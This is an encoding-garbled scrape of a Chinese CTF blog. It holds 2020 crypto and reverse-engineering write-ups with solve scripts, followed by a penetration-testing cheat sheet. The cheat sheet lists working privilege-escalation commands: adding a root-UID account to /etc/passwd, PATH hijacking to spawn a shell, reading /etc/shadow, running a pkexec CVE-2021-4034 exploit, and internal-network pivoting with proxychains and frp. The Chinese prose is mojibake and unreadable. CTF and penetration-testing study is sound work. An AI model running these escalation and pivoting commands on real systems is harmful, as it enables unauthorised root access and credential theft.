ç³»ç»Ÿï¼Œè¿˜æŒºå¹´è½»çš„ã€‚ 12345678910111213141516171819202122232425from Crypto.Util.number import getPrime as getprime ,long_to_bytes,bytes_to_long,inversefrom vanish import flagfrom sympy import isprime,nextprimeimport randomm=bytes_to_long(flag)p=getprime(512)q=nextprime(512)n=p*qr=random.randint(1,n)g=random.randint(1,n)c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)print &quot;c=%d&quot;%(c)print &quot;n=%d&quot;%(n)print &quot;g=%d&quot;%(g)&#x27;&#x27;&#x27;c=14643617840485727260687883789514337554960495078025159182484344940901600090810578182116617501128323641882943106663241094886209190199404002314247096613925999812837877843566116787148411743428714726661042213165729562285577768043368385746666607442372252641495230532588344276427261824205414379772728577442269620217619275n=5650215343715484415924649393302012617620686312875699289646188186788806118580423414401283971780836312947326343790326120926819026727018136169739576760024802083g=786539430846729749998127835613552594423101498023741082894370020014675937062722533682541592019332908209917194089077366019472368764411032602494945304850258108&#x27;&#x27;&#x27; 1999å¹´æå‡ºçš„PaillieråŒæ€åŠ å¯†ï¼Œè¿™é‡Œä¸ºä¸€èˆ¬æƒ…å†µï¼Œå‚è€ƒç®—æ³•ä»£å…¥è®¡ç®—å³å¯ã€‚ 123456789101112131415161718c=14643617840485727260687883789514337554960495078025159182484344940901600090810578182116617501128323641882943106663241094886209190199404002314247096613925999812837877843566116787148411743428714726661042213165729562285577768043368385746666607442372252641495230532588344276427261824205414379772728577442269620217619275n=5650215343715484415924649393302012617620686312875699289646188186788806118580423414401283971780836312947326343790326120926819026727018136169739576760024802083g=786539430846729749998127835613552594423101498023741082894370020014675937062722533682541592019332908209917194089077366019472368764411032602494945304850258108import gmpy2def L(x): return (x-1)//n#åˆ†è§£np=521q=10844943078148722487379365438199640340922622481527253914867923583087919613398125555472713957352852807960319277908495433640727498516349589577235272092178123lcm=gmpy2.lcm(p-1,q-1)u=gmpy2.invert(L(pow(g,lcm,n*n)),n)m=L(pow(c,lcm,n*n))*u%nprint(bytes.fromhex(hex(m)[2:])) â€‹ ezrsa æˆ–è®¸æ˜¯å‡ºäºç†æ€§äº¦æˆ–æ˜¯ææƒ§ï¼Œæ€»ä¹‹æˆ‘æŠŠè¿™é“é¢˜è—äº†èµ·æ¥ã€‚æˆ‘æš—ä¸­æ„Ÿè§‰åˆ°å®ƒæœ‰ç€è¯±äººå‘ç‹‚çš„èƒ½åŠ›ï¼Œæˆ‘ä¸èƒ½è®©æ›´å¤šäººè§åˆ°å®ƒï¼Œè¿™é“é¢˜æ˜¯é»‘æš—ä¸­ä¸å¯åçŠ¶çš„æ¶å…½ã€‚ 12345678910111213141516171819202122232425262728from Crypto.Util.number import *from secret import e3,hint,flage1=2p1=1407082287125181464014767936705655200254016298201118080211963q1=4483497795612950594917254979514794222210515250120330465584919hint=int(hint.encode(&#x27;hex&#x27;),16)c1=pow(hint,e1,p1*q1)e2=5q2=898033p2=1027487assert e3&lt;=300c2=pow(e3,e2,p2*q2)q3=16471885912035642894544190467774867069446937372970845578732298073p3=21122913513992623721920275602985463699928507831138027#flag=&#x27;flag&#123;*************&#125;&#x27;flag=int(flag.encode(&#x27;hex&#x27;),16) c3=pow(flag,e3,p3*q3)print c1 #1094524901124574666920734011106836493645715846893412590792284228545024220996290692759698315651894211650519689592667719756print c2 #779811265199print c3 #346925245648012783854132941104554194717281878370806475831055718275298366664505658836564073456294047402009856656647760 RSAå°å¥—å¨ƒé¢˜ã€‚ å…ˆä» $e1,p1,q1,c1$ è§£hintï¼Œ$e=2$ çš„æƒ…å½¢ä¸ºRabinåŠ å¯† 123456789101112131415161718192021222324252627import gmpy2def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) e1=2p1=1407082287125181464014767936705655200254016298201118080211963q1=4483497795612950594917254979514794222210515250120330465584919c1=1094524901124574666920734011106836493645715846893412590792284228545024220996290692759698315651894211650519689592667719756m=rabin_decrypt(c1,p1,q1,e1)for k in m: try: print(bytes.fromhex(hex(k)[2:])) except: pass #hint: https://eprint.iacr.org/2013/117.pdf å››è§£ä¸­æœ‰ä¸€è§£ä¸ºçœŸæ­£çš„hintï¼Œå¾—åˆ°ä¸€ä¸ªpaperç½‘å€ï¼šhttps://eprint.iacr.org/2013/117.pdf å†ä» $e2,p2,q2,c2$ è§£ $e3$ï¼Œå¸¸è§„RSA 12345678910111213p2=1027487q2=898033e2=5c2=779811265199import gmpy2fn2=(p2-1)*(q2-1)d2=gmpy2.invert(e2,fn2)e3=pow(c2,d2,p2*q2)print(e3)#e3=239 æœ€åä» $e3,p3,q3,c3$ è§£ $m$ï¼Œéš¾ç‚¹åœ¨äºå­˜åœ¨æƒ…å½¢ $e \\mid p-1,e \\mid q-1$ï¼Œå‚è€ƒhintè®ºæ–‡ï¼Œåœ¨æœ‰é™åŸŸä¸‹æ±‚ $e$ æ¬¡æ ¹ 123456789101112131415161718192021###Sagec = 346925245648012783854132941104554194717281878370806475831055718275298366664505658836564073456294047402009856656647760p = 21122913513992623721920275602985463699928507831138027q = 16471885912035642894544190467774867069446937372970845578732298073e = 239P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=&#x27;NTL&#x27;)f=a^e-cmps=f.monic().roots()P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=&#x27;NTL&#x27;)g=a^e-cmqs=g.monic().roots()for mpp in mps: x=mpp[0] for mqq in mqs: y=mqq[0] solution = hex(CRT_list([int(x), int(y)], [p, q]))[2:] if solution.startswith(&#x27;666c&#x27;): print(solution) â€‹ REVERSEâ›âWDNMDâ â æˆ‘èµ·äº†ï¼Œä¸€æªç§’äº†ï¼Œæœ‰ä»€ä¹ˆå¥½è¯´çš„ï¼ˆç™½ç»™ç­¾åˆ°é¢˜ï¼‰ F5æœªå‘ç°æœ‰ç”¨ä¿¡æ¯ï¼Œå›åˆ°æ±‡ç¼–ä»£ç ï¼Œå‘ç°main()å‡½æ•°é‡Œæœ‰flagååŠæ®µï¼š å›åˆ°å…¨å±€åæ±‡ç¼–çª—å£ï¼ŒAlt+Tå…¨å±€æœç´¢â€flag{â€œï¼Œå‘ç°dataæ®µè—ç€flagå‰åŠæ®µï¼š â€‹ 98å¹´çš„ï¼Œæˆ‘ç©ä¸è¿‡å¥¹ å¦‚æœä¸æ˜¯çœŸçš„å–œæ¬¢ï¼Œè°åˆæ„¿æ„åšèˆ”ç‹—å‘¢ ä»å­—ç¬¦ä¸²çª—å£å®šä½å…¥å£åœ¨sub_140011950å‡½æ•°ï¼š è·å–é•¿åº¦ä¸º10çš„å­—ç¬¦ä¸²å­˜å…¥Bufferæ•°ç»„ï¼Œä»¤v5[0:10]=Buffer[5:15]ï¼Œç»sub_14001128Aå‡½æ•°å¤„ç†åå¾—åˆ°Str1ï¼Œå°†å…¶ä¸ I_love_y&amp;u æ¯”è¾ƒï¼Œç›¸ç­‰åˆ™æ­£ç¡®ã€‚ è·Ÿè¿›sub_14001128Aå‡½æ•°ï¼Œå‘ç°switch-caseéå†ç»“æ„ï¼š åˆ†åˆ«æŠŠswitch-caseç»“æ„ä¸­caseå„å­—ç¬¦å¯¹åº”çš„ç»“æœå­—ç¬¦æ±‚å‡ºï¼Œé€ä¸ªæ¯”å¯¹ I_love_y&amp;u æ¯ä¸ªå­—ç¬¦ï¼Œè¿˜åŸå¾—åŸå§‹Buffer[5:15]å€¼ï¼Œæ·»åŠ å‰å››ä¸ªå­—ç¬¦â€œflag{â€å¯å¾—flagã€‚ â€‹ four steps åšreå¥½åƒæŒºç®€å•çš„ï¼Œä¸å°±æ˜¯è§£å†³äº†è¿™å››ä¸ªæ­¥éª¤ä¸å°±å¥½äº†ã€‚ ä»å­—ç¬¦ä¸²çª—å£å®šä½å…¥å£åœ¨sub_1400159A0å‡½æ•°ï¼š è¯»å­—ç¬¦ä¸²å­˜å…¥Bufferï¼Œç¬¬ä¸€æ­¥sub_1400113ACå‡½æ•°å¤„ç†ï¼Œæ¯”å¯¹Buffer[0:4]ï¼›ç¬¬äºŒæ­¥sub_1400113B1å‡½æ•°å¤„ç†Buffer[4:8]ï¼›ç¬¬äºŒæ­¥è¿”å›å€¼ä¸º0åˆ™è¿›å…¥ç¬¬ä¸‰æ­¥ï¼Œsub_1400113B6å‡½æ•°å¤„ç†Buffer[8:12]ï¼›ç¬¬å››æ­¥sub_1400113C5å‡½æ•°å¤„ç†Buffer[12:16]ã€‚ ç¬¬ä¸€æ­¥ å…ˆåˆå§‹åŒ–256å¤§å°çš„æ•°ç»„aï¼Œå†åšå¥‡æ•°ä¸‹æ ‡çš„å€¼å‰åäº¤æ¢ï¼Œçˆ†ç ´Buffer[0:4]ï¼š 1234567891011121314a=[j for j in range(256)]for j in range(128): if j%2==1: a[j],a[256-j]=a[256-j],a[j]c=[96,106,153,159]m=&#x27;&#x27;for cc in c: for k in range(128): if a[k]^6==cc: m+=chr(k) breakprint(m)#flag ç¬¬äºŒæ­¥ æ ¹æ®ç­‰å¼çˆ†ç ´ï¼Œé€‰æ‹©åˆé€‚ç»“æœï¼š 1234567891011m=&#x27;&#x27;for x4 in range(128): for x5 in range(128): for x6 in range(128): for x7 in range(128): if (x5&gt;&gt;4)+(x4&gt;&gt;4)==13 and (x7&gt;&gt;4)+(x6&gt;&gt;4)==13 and (x4&amp;0xF)-(x5&amp;0xF)==10 and (x6&amp;0xF)-(x7&amp;0xF)==11 and (x6&amp;0xF)-(x5&amp;0xF)==13 and (x5&gt;&gt;4)==(x6&gt;&gt;4): m=chr(x4)+chr(x5)+chr(x6)+chr(x7) print(m)#6ä¸ªç»“æœï¼Œé€‰æ‹©æ­£ç¡®çš„#&#123;ans ç¬¬ä¸‰æ­¥ å˜äº†ç è¡¨çš„base64ç¼–ç ï¼Œç è¡¨ä¸ºAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz1234567890+/ï¼Œç¼–ç ç»“æœo3kZl3==ï¼Œä½¿ç”¨å·¥å…·è§£ç å¾—wer_ã€‚ ç¬¬å››æ­¥ åŒç¬¬ä¸€æ­¥ï¼Œçˆ†ç ´Buffer[12:16]ï¼š 123456789c=[214,86,18,215]m=&#x27;&#x27;for cc in c: for k in range(128): if 16*(k&amp;0xF)+(k&gt;&gt;4)==cc: m+=chr(k) breakprint(m)#me!&#125; æ‹¼æ¥å››æ­¥å¾—åˆ°çš„å­—ç¬¦ä¸²å¾—flagã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"DASCTF 2020 å®‰æ’ä¸ƒæœˆèµ›","slug":"match-DASCTF-2020-å®‰æ’ä¸ƒæœˆèµ›","date":"2020-07-25T07:48:51.000Z","updated":"2020-07-25T09:17:10.216Z","comments":true,"path":"2020/07/25/match-DASCTF-2020-å®‰æ’ä¸ƒæœˆèµ›/","permalink":"https://lazzzaro.github.io/2020/07/25/match-DASCTF-2020-%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E8%B5%9B/","excerpt":"","text":"â€‹ MISCwelcome to the misc worldè§£å‹å¾—ä¸€å¼ å›¾red_blue.pngå’ŒåŠ å¯†å‹ç¼©åŒ…flag.rarï¼Œé‚£ä¹ˆå¯†ç è‚¯å®šåœ¨å›¾é‡Œäº†ã€‚ ç”±å…³é”®å­—red/blueæƒ³åˆ°lsbéšå†™ï¼Œç”¨Stegsolveå·¥å…·æŸ¥æ‰¾æ— ç»“æœï¼Œæ”¾åˆ°zstegå‘½ä»¤ä¸‹çœ‹ï¼Œå‘ç°pngå›¾ï¼Œæå–å‡ºæ¥ï¼š å¾—åˆ°å‹ç¼©åŒ…å¯†ç  /*///1258/*/@#ã€‚ ç”¨360å‹ç¼©æ‰“å¼€ç›´æ¥èƒ½çœ‹åˆ°NTFSéšå†™æ–‡ä»¶ï¼š (23333~~) æ‰“å¼€flag.txtï¼Œå¾—åˆ°ä¸€ä¸²å­—ç¬¦ï¼Œç”±åŒ…å«çš„å­—ç¬¦çŒœæµ‹ä¸ºbase85ç¼–ç ï¼Œå°è¯•è§£ç å¾—åˆ°flagã€‚ â€‹ CRYPTObullshit ç»™å®šè„šæœ¬ 123456789101112131415161718from flag import flagdef pairing(a,b): shell = max(a, b) step = min(a, b) if step == b: flag = 0 else: flag = 1 return shell ** 2 + step * 2 + flagdef encrypt(message): res = &#x27;&#x27; for i in range(0,len(message),2): res += str(pairing(message[i],message[i+1])) return resprint(encrypt(flag))# 1186910804152291019933541010532411051999082499105051010395199519323297119520312715722 åŠ å¯†è„šæœ¬æ€è·¯ï¼š å°†æ˜æ–‡messageæ¯ä¸¤ä¸ªå­—ç¬¦åˆ†åˆ«ä½œä¸ºpairing()å‡½æ•°çš„å‚æ•°ï¼Œè¿”å›çš„intç»“æœå€¼è¿æ¥ï¼Œå¾—åˆ°è¾“å‡ºå¯†æ–‡ã€‚ å› flagå¯èƒ½åŒ…å«çš„ASCIIå­—ç¬¦çš„åè¿›åˆ¶å€¼ $48 \\leq d \\leq 126$ï¼Œç”±pairing()å‡½æ•°è¿”å›å€¼çŸ¥ï¼Œå¾—åˆ°çš„intç»“æœå€¼èŒƒå›´ä¸º $48^2+48\\cdot2+0 \\leq v \\leq 126^2+126\\cdot2+1 \\Rightarrow 2400 \\leq v \\leq 16129$ æŒ‰èŒƒå›´åˆ†å‰²å¯†æ–‡ï¼Œå†åˆ†åˆ«çˆ†ç ´æ¯ä¸ªçš„è¾“å…¥å‚æ•°ï¼š 1234567891011121314151617181920import stringdic=string.printable[:-6]def pairing(a,b): shell = max(a, b) step = min(a, b) if step == b: flag = 0 else: flag = 1 return shell ** 2 + step * 2 + flagc=[11869,10804,15229,10199,3354,10105,3241,10519,9908,2499,10505,10103,9519,9519,3232,9711,9520,3127,15722]flag=&#x27;&#x27;for k in c: for x in dic: for y in dic: if pairing(ord(x),ord(y))==k: flag+=x+yprint(flag) â€‹ ezrsa ç»™å®šè„šæœ¬ 1234567891011121314151617181920212223242526272829303132from secret import flagfrom Crypto.Util.number import getPrime,inverse,bytes_to_long,long_to_bytesfrom sympy import isprimem = bytes_to_long(flag)i=0p=getPrime(1024)r=getPrime(1024)while True: i+=1 q = 5*p+i if isprime(q) : breakn=p*q*re = 65537c = pow(m,e,n)p3 = pow(p,3,n)q3 = pow(q,3,n)print cprint eprint nprint p3print q3#c=121836624300974075697021410307617877799398704636412997043885070081959280989429720121505939271618801519845564677294487289085261071864489530938936756975266796724602572135614554790383740417604947122325421381322155502222532570899845171858215244411945889235509975121332503672838693190271397334662495169940649349725607212867270114445618201171582223868214171942753939282404133460110489725340075179818856587044172460703519751189284498768640898837525773823127259807337383870535232880471869465188882667401540052151795173003568424369575866780354852158304748299284900468768898966143729562589110027789165774068500360970335261801131264801996703446527156709491597639262305131309592217711956181866054589085773085822482247966030763162382493197473555330201343835684065991963179440335668817727280429581864224497755004825170263803174390985868997862117983334405815543271969716910040927833496696049703621334172902517666284662473059140662717708823#e=65537#n=20361372240024088786698455948788052559208001789410016096382703853157107986024860262721685000417719260611935731634077852127432140361792767202581631816544546972750034494061276779878409544779707914261679633764772575040304712361634318086289783951555842021028438799649252652041211341825451500751760872572402250747982495384263677669526575825183733353800694161425360299521143726681387485097281832219009682768523304737252763907939642212542959846630464628135025203489075698699980715986689341069964387779523254203021424865355054215122316160201073604105317768112281914334065349420946717116563634883368316247495042216330408372176714499012778410160478384503335610321108263706243329745785632599707740534386988945259578897614317582546751658480917188464178997026284336861027299289073045677754342746386408505695243800685323283852020325044649604548575089927541935884800327121875191739922436199496098842684301207745090701158839031935190703347091#p3=3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513#q3=7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397 ç”±è„šæœ¬çŸ¥ $p,q$ ä¸ºçº¿æ€§å…³ç³»ï¼š $q=5p+k,k\\in\\mathbb{Z}$ åˆå·²çŸ¥ $p,q$ ç”¨ $e=3$ å¾—åˆ°çš„å¯†æ–‡ $p3,q3$ï¼Œæ»¡è¶³ Related Message Attack æ¡ä»¶ï¼Œè¿è¡ŒSageè„šæœ¬å¾—åˆ° $p,q$ï¼Œå†æ±‚å¾— $r$ï¼ŒæŒ‰ç…§å¸¸è§„RSAè§£æ³•æ±‚å‡ºflagã€‚ Related Message Attack Sageè„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435#Sagedef short_pad_attack(c1, c2, e, n): PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (5*x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor &gt;= n^0.4 return diffdef related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (5*x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]if __name__ == &#x27;__main__&#x27;: n = 20361372240024088786698455948788052559208001789410016096382703853157107986024860262721685000417719260611935731634077852127432140361792767202581631816544546972750034494061276779878409544779707914261679633764772575040304712361634318086289783951555842021028438799649252652041211341825451500751760872572402250747982495384263677669526575825183733353800694161425360299521143726681387485097281832219009682768523304737252763907939642212542959846630464628135025203489075698699980715986689341069964387779523254203021424865355054215122316160201073604105317768112281914334065349420946717116563634883368316247495042216330408372176714499012778410160478384503335610321108263706243329745785632599707740534386988945259578897614317582546751658480917188464178997026284336861027299289073045677754342746386408505695243800685323283852020325044649604548575089927541935884800327121875191739922436199496098842684301207745090701158839031935190703347091 e = 3 c1 = 3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513 c2 = 7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397 diff = short_pad_attack(c1, c2, e, n) print(&quot;difference of two messages is %d&quot; % diff) p = related_message_attack(c1, c2, diff, e, n) print(&quot;p:&quot;, p) print(&quot;q:&quot;, 5*p + diff)","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"æ¸—é€","slug":"web-æ¸—é€","date":"2020-07-23T16:49:37.000Z","updated":"2023-10-31T17:58:53.618Z","comments":true,"path":"2020/07/24/web-æ¸—é€/","permalink":"https://lazzzaro.github.io/2020/07/24/web-%E6%B8%97%E9%80%8F/","excerpt":"","text":"â€‹ æ¸—é€ï¼ˆHack The Box / HTBï¼‰æ‰«æ nmap nmap -sC -sV xx.xx.xx.xx -oA src/ -sC is for using default nmap scripts, -sV for enumerating services versions, -oA is for output ALL format and specify the directory src, NOTICE: you may be adding -Pn if you have an error wait for some time and here is the result. â€‹ ææƒå‚è€ƒï¼šGTFOBins SUIDææƒï¼ˆ4000æƒé™ï¼‰ SUIDå¯ä»¥è®©è°ƒç”¨è€…ä»¥æ–‡ä»¶æ‹¥æœ‰è€…çš„èº«ä»½è¿è¡Œè¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨SUIDææƒçš„æ€è·¯å°±æ˜¯è¿è¡Œrootç”¨æˆ·æ‰€æ‹¥æœ‰çš„SUIDçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿è¡Œè¯¥æ–‡ä»¶çš„æ—¶å€™å°±å¾—è·å¾—rootç”¨æˆ·çš„èº«ä»½äº†ã€‚ å‘ç°ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸åŒç³»ç»Ÿé€‚ç”¨äºä¸åŒçš„å‘½ä»¤ï¼š 123find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -print 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; ç¯å¢ƒå˜é‡ 123456789#/home/raj/script/shellå…·SUIDæƒé™cd /tmpecho â€œ/bin/bashâ€ &gt; pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/raj/script./shellwhoami find 123# æ™®é€šç”¨æˆ·ï¼Œè¿›å…¥åˆ°/tmpç›®å½•ä¸‹ï¼Œç„¶åæ–°å»ºä¸€ä¸ªæ–‡ä»¶touch abcdfind abcd -exec whoami \\; /etc/shadow 1xxd &quot;/etc/shadow&quot; | xxd -r /etc/passwd 12345cat /etc/passwd&gt;passwdecho &quot;test:abRcsZmlrrKFA:0:0:,,,:/root:/bin/bash&quot; &gt;&gt;passwdcp passwd /etc/passwdpython3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;su - test nl nl /flag date /usr/bin/date -f /flag ï¼ˆåˆ©ç”¨dateå‘½ä»¤çš„ -f å‚æ•°è¯»å–æ–‡ä»¶ï¼‰ curl curl file:///flag cp å…ˆ cp /bin/sh /bin/cpï¼Œå cp python python -c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39; ä»¥å…¶ä»–ç”¨æˆ·è¿è¡Œå‘½ä»¤ sudo -l ï¼ˆæŸ¥çœ‹æ­¤ç”¨æˆ·æ‹¥æœ‰çš„ç‰¹æ®Šæƒé™ï¼Œå¦‚ NOPASSWDï¼Œè·¯å¾„ /etc/sudoer.dï¼‰ echo password | su -c userB cat xxx.txt æ ¹ç›®å½•érootæƒé™ ls -al / ï¼ˆæ£€æŸ¥æ ¹ç›®å½•æƒé™æ˜¯å¦érootï¼‰ 123456mv bin bin1/bin1/mkdir bin/bin1/chmod 777 bin/bin1/echo &quot;/bin1/cat /flag&quot; &gt; /bin/umount/bin1/chmod 777 /bin/umountexit pkexecææƒæ¼æ´ /usr/lib/policykit-1/polkit-agent-helper-1 https://github.com/arthepsy/CVE-2021-4034 12chmod +x ./pkexec_poc./pkexec_poc â€‹ éå¸¸è§„è¯»æ–‡ä»¶12/lib/gcc/x86_64-linux-gnu/[id]/cc1 /etc/passwd -o /dev/null/lib/gcc/x86_64-linux-gnu/[id]/cc1plus /etc/passwd -o /dev/null â€‹ å†…ç½‘ç©¿é€ æ¢æµ‹å†…ç½‘ä¸»æœº 1for k in $( seq 1 255);do ping -c 1 10.203.113.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#x27;&#123;print $4&#125;&#x27;; done å¸¸è§ç«¯å£æ‰«æ EWä»£ç†ï¼š./ew_for_linux64 -s ssocksd -l 9999 æ‰«æï¼šproxychains3 nmap æ‰«æå¸¸è§ç«¯å£ æ“ä½œ è¿œç¨‹è¿æ¥æ•°æ®åº“ï¼šproxychains3 mysql -h 10.203.113.33 -u ctf -p å¯åŠ¨ç«ç‹æµè§ˆå™¨ï¼šproxychains3 firefox è¿œç¨‹è¿æ¥ï¼šproxychains3 rdesktop 10.203.113.34:3389 proxychainsProxyChainsæ˜¯Linuxå’Œå…¶ä»–Unixä¸‹çš„ä»£ç†å·¥å…·ã€‚ å®ƒå¯ä»¥ä½¿ä»»ä½•ç¨‹åºé€šè¿‡ä»£ç†ä¸Šç½‘ï¼Œ å…è®¸TCPå’ŒDNSé€šè¿‡ä»£ç†éš§é“ï¼Œ æ”¯æŒHTTPã€ SOCKS4å’ŒSOCKS5ç±»å‹çš„ä»£ç†æœåŠ¡å™¨ï¼Œ å¹¶ä¸”å¯é…ç½®å¤šä¸ªä»£ç†ã€‚ ProxyChainsé€šè¿‡ä¸€ä¸ªç”¨æˆ·å®šä¹‰çš„ä»£ç†åˆ—è¡¨å¼ºåˆ¶è¿æ¥æŒ‡å®šçš„åº”ç”¨ç¨‹åºï¼Œ ç›´æ¥æ–­å¼€æ¥æ”¶æ–¹å’Œå‘é€æ–¹çš„è¿æ¥ã€‚ é…ç½®æ–‡ä»¶ï¼š/etc/proxychains.confï¼Œåœ¨æœ«å°¾æ·»åŠ ä»£ç†ã€‚ frpfrp æ˜¯ä¸€ä¸ªä¸“æ³¨äºå†…ç½‘ç©¿é€çš„é«˜æ€§èƒ½çš„åå‘ä»£ç†åº”ç”¨ï¼Œæ”¯æŒ TCPã€UDPã€HTTPã€HTTPS ç­‰å¤šç§åè®®ã€‚å¯ä»¥å°†å†…ç½‘æœåŠ¡ä»¥å®‰å…¨ã€ä¾¿æ·çš„æ–¹å¼é€šè¿‡å…·æœ‰å…¬ç½‘ IP èŠ‚ç‚¹çš„ä¸­è½¬æš´éœ²åˆ°å…¬ç½‘ã€‚ é¡¹ç›®åœ°å€ https://github.com/fatedier/frp/blob/master/README_zh.md ç›®å½•æ–‡ä»¶ï¼š 1234567frpc å®¢æˆ·ç«¯å¯æ‰§è¡Œç¨‹åºfrpc_full.ini å®¢æˆ·ç«¯æ‰€æœ‰é…ç½®é¡¹ï¼ˆå¯ä»¥å†æ­¤æ–‡ä»¶æŸ¥çœ‹frpçš„æ‰€æœ‰çš„é…ç½®é¡¹ï¼‰frpc.ini å®¢æˆ·ç«¯é…ç½®é¡¹frps æœåŠ¡ç«¯å¯æ‰§è¡Œç¨‹åºfrps_full.ini æœåŠ¡ç«¯æ‰€æœ‰é…ç½®é¡¹ï¼ˆå¯ä»¥å†æ­¤æ–‡ä»¶æŸ¥çœ‹frpçš„æ‰€æœ‰çš„é…ç½®é¡¹ï¼‰frps.ini æœåŠ¡ç«¯é…ç½®é¡¹LICENSE è®¸å¯è¯ æœåŠ¡ç«¯é…ç½®ï¼ˆ frps.ini æ–‡ä»¶ï¼‰ 123[common]bind_port = 7000 # å®¢æˆ·ç«¯è·ŸæœåŠ¡ç«¯ç»‘å®šçš„ç«¯å£å·ï¼ˆç«¯å£å¯è‡ªå®šä¹‰ï¼Œéœ€å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç»Ÿä¸€ï¼‰vhost_http_port = 6001 # è®¿é—®6001ç«¯å£ï¼Œæ˜ å°„åˆ°å†…ç½‘webæœåŠ¡ å¯åŠ¨ï¼š ./frps -c frps.ini å®¢æˆ·ç«¯é…ç½®ï¼ˆ frpc.ini æ–‡ä»¶ï¼‰ 1234567891011121314151617181920212223[common]server_addr = x.x.x.x # æœåŠ¡å™¨å…¬ç½‘IPserver_port = 7000 # ç»‘å®šçš„ç«¯å£ï¼Œè‡ªå®šä¹‰ï¼Œä¸æœåŠ¡ç«¯ä¸€è‡´å³å¯[ssh]type = tcplocal_ip = 127.0.0.1 # ç»‘å®šçš„IPï¼Œæœ¬æœºå¡«å†™127.0.0.1å³å¯local_port = 22remote_port = 6008 # sshé»˜è®¤æ˜¯22ï¼Œè½¬å‘ä¸º6008ç«¯å£# è®¿é—®ï¼šssh root@x.x.x.x -p 6008[web]type = httplocal_port = 8080 # è®¿é—®æœ¬åœ°8080webæœåŠ¡custom_domains = x.x.x.x # 